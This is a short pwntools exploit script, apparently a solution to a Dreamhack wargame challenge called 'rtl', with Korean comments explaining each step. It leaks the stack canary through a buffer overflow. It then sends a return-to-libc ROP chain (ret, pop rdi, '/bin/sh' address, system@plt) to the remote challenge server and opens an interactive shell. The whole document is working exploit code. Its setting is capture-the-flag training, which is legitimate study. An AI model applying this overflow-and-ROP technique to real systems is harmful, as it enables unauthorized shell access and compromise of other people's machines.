from pwn import *

p = remote('host3.dreamhack.games', 23054)
e = ELF('rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39 # 스택구조
p.sendafter(b'Buf: ', buf) # 버프 바이너리 텍스트 나오면 buf를 전송 
p.recvuntil(buf)  # buf 출력될 때까지 읽음
cnry = u64(b'\x00' + p.recvn(7)) # 이후 7글자가 카나리
slog('canary', cnry) # 까나리 액젓

# [2] Exploit
sysplt=e.plt['system'] # sysplt에 system@plt함수 할당
binsh= 0x400874 # 서치 명령어로 찾은 binsh 주소
poprdi=0x0000000000400853 # ROP가젯 명령어로 찾은 pop rdi 주소
ret=0x0000000000400596 # ret 주소

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8 # 스택구조
payload += p64(ret) # movaps 오류 방지 가젯 추가
payload += p64(poprdi) # pop rdi
payload += p64(binsh)  # /bin/sh
payload += p64(sysplt) # system@plt

pause() # 코드 실행 중지
p.sendafter(b'Buf: ', payload) # 페이로드 전송

p.interactive() # 인터렉티브
 